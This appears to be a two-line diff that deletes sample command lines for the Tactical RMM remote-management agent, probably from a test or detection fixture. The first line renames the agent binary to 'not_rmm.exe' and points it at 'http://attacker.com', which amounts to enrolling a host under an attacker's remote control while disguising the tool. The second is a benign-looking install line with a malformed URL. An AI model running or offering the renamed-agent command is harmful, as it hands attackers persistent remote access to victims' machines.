@@ -1,2 +1,0 @@
-copy tacticalrmm.exe not_rmm.exe && not_rmm.exe --api http://attacker.com --auth token --client-id 1 --site-id 2 --agent-type mesh
-tacticalrmm.exe --api httprmm.example.com --auth token123 --client-id 1 --site-id 1 --agent-type workstation
